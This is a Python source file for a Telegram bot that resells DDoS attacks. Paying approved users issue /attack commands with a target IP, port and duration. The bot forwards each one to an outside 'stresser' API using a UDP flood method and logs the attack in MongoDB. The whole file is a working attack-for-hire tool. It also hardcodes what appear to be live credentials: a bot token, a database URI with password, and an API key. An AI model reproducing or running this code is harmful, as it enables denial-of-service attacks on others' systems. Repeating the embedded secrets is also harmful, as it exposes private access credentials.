import asyncio
import logging
import os
import re
import uuid
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

# --- CONFIGURATION ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")

# Battle Destroyer API Details
API_URL = "https://api.battle-destroyer.shop/api/attack"
API_KEY = "ak_e09b114844018935feffc" 
ADMIN_IDS = [8787952549]

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 80, 22}

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self._setup_indexes()

    def _setup_indexes(self):
        self.users.create_index([("user_id", ASCENDING)], unique=True)
        self.attacks.create_index([("timestamp", DESCENDING)])

    def get_user(self, user_id: int):
        return self.users.find_one({"user_id": user_id})

    def create_user(self, user_id: int, username: str = None):
        if not self.get_user(user_id):
            user_data = {
                "user_id": user_id, "username": username, "approved": False,
                "expires_at": None, "total_attacks": 0, "created_at": datetime.now(timezone.utc)
            }
            self.users.insert_one(user_data)

    def approve_user(self, user_id: int, days: int):
        expiry = datetime.now(timezone.utc) + timedelta(days=days)
        self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "expires_at": expiry}})
        return expiry

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str):
        self.attacks.insert_one({
            "user_id": user_id, "ip": ip, "port": port, "duration": duration,
            "status": status, "timestamp": datetime.now(timezone.utc)
        })
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# --- HELPERS ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin Access Required.")
            return
        return await func(update, context)
    return wrapper

async def is_approved(user_id: int):
    user = db.get_user(user_id)
    if not user or not user.get("approved"): return False
    expiry = user.get("expires_at")
    if expiry and expiry.replace(tzinfo=timezone.utc) < datetime.now(timezone.utc):
        return False
    return True

# --- API LAUNCHER ---
def launch_stresser_attack(ip: str, port: int, duration: int):
    params = {
        "api_key": API_KEY,
        "target": ip,
        "port": port,
        "duration": duration,
        "methods": "UDP-MIX"
    }
    try:
        response = requests.get(API_URL, params=params, timeout=15)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db.create_user(user_id, update.effective_user.username)
    
    if await is_approved(user_id):
        await update.message.reply_text("✅ Bot Active! Use `/attack <ip> <port> <time>`")
    else:
        await update.message.reply_text("❌ Account not approved. Contact Admin.")

@admin_required
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        return await update.message.reply_text("Usage: /approve <id> <days>")
    
    uid, days = int(context.args[0]), int(context.args[1])
    expiry = db.approve_user(uid, days)
    await update.message.reply_text(f"✅ User {uid} approved until {expiry.strftime('%Y-%m-%d')}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_approved(user_id):
        return await update.message.reply_text("❌ Subscription required.")

    if len(context.args) < 3:
        return await update.message.reply_text("Format: /attack <ip> <port> <time>")

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])

    if port in BLOCKED_PORTS:
        return await update.message.reply_text("🚫 Port is blocked.")

    msg = await update.message.reply_text("🚀 Sending request to API...")
    
    result = launch_stresser_attack(ip, port, duration)
    db.log_attack(user_id, ip, port, duration, "success" if "success" in str(result).lower() else "failed")
    
    await msg.edit_text(f"🎯 **Attack Sent!**\nTarget: `{ip}:{port}`\nResponse: `{result}`")

# --- MAIN ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("approve", approve))
    
    print("✅ Bot is running with Direct API integration...")
    app.run_polling()

if __name__ == "__main__":
    main()
